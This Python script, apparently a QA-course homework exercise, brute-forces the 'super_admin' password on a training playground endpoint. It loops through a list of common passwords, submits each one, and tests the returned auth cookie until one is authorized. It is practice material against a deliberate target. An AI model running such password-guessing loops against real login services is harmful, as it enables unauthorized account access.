import requests

passList = ['123456', '123456789', 'qwerty', 'password', '1234567', '12345678', '12345', 'iloveyou', '111111', '123123', 'abc123', 'qwerty123', '1q2w3e4r', 'admin', 'qwertyuiop', '654321', '555555', 'lovely', '7777777', 'welcome', '888888', 'princess', 'dragon', 'password1', '123qwe', 'sunshine', 'baseball', 'qaz2wsx', 'mustang', 'access', 'shadow', '666666', 'azerty', 'football', 'ninja', 'monkey', 'bailey', '!@#$%^&*', 'charlie', 'aa123456', 'donald', 'letmein', 'michael', 'superman', '696969', 'batman', '0', 'ashley', 'login', 'jesus', 'starwars', 'adobe123', 'photoshop', 'passw0rd', 'master', 'hello', 'freedom', 'whatever', 'qazwsx', 'trustno1', '1234567890', '1234', 'solo', '121212', 'flower', 'hottie', 'loveme', 'zaq1zaq1']
url = 'https://playground.learnqa.ru/ajax/api/get_secret_password_homework'
checkUrl = 'https://playground.learnqa.ru/ajax/api/check_auth_cookie'
num = 0

while len(passList) >= 68:
    password = passList[num]
    response = requests.post(url, data={"login": "super_admin", "password": {password}})
    cookieValue = response.cookies.get('auth_cookie')
    cookie = {'auth_cookie': cookieValue}
    checkResponse = requests.post(checkUrl, cookies=cookie)
    if checkResponse.text == 'You are authorized':
        print(f'DONE - password is {password}')
        break
    else:
        print(f'password {password} is not correct, checking next...')
        num += 1
